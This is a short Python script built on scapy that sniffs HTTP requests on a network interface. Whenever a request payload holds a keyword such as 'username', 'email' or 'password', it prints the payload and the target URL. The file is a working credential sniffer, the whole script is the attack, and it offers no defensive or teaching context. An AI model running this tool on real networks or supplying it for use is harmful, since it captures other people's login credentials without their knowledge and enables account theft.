import argparse
import scapy.all as scapy
from scapy.layers import http

def get_options():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",default="eth0",help="Interface of the Network")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn = process_sniffed_data)

def process_sniffed_data(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username","user","email","login","password","pass","pwd"]
            flag = False
            for keyword in keywords:
                if keyword in load:
                    flag = True
                    break
            if flag:
                print(load)
                print(url)

options = get_options()

sniff(options.interface)
